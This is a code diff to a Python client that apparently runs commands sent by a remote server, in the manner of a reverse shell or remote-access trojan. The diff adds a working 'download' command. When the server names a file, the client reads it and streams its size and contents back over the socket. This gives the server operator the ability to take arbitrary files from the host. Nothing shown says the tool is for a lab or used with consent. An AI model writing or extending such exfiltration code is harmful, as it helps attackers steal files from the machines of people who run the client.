@@ -73,6 +73,33 @@ def is_connection_alive(s):
     except Exception:
         return False
 
+# Send file to server (for download command)
+def send_file(s, filename):
+    try:
+        if not os.path.isfile(filename):
+            s.send(b"FILE_NOT_FOUND")
+            log_message(f"File not found: {filename}", "ERROR")
+            return False
+        
+        file_size = os.path.getsize(filename)
+        s.send(file_size.to_bytes(8, 'big'))
+        
+        with open(filename, 'rb') as f:
+            bytes_sent = 0
+            while bytes_sent < file_size:
+                chunk = f.read(4096)
+                if not chunk:
+                    break
+                s.send(chunk)
+                bytes_sent += len(chunk)
+        
+        log_message(f"File sent: {filename} ({file_size} bytes)")
+        return True
+        
+    except Exception as e:
+        log_message(f"Error sending file: {str(e)}", "ERROR")
+        return False
+
 # Execute commands received from server
 def execute_commands(s):
     try:
@@ -94,6 +121,14 @@ def execute_commands(s):
                 if not data:
                     log_message("Server closed connection", "WARNING")
                     break
+                
+                cmd = data.decode("utf-8")
+                
+                if cmd.startswith("download "):
+                    filename = cmd[9:].strip()
+                    log_message(f"Download requested: {filename}")
+                    send_file(s, filename)
+                    continue
                 
                 if data[:2].decode("utf-8") == 'cd':
                     try:
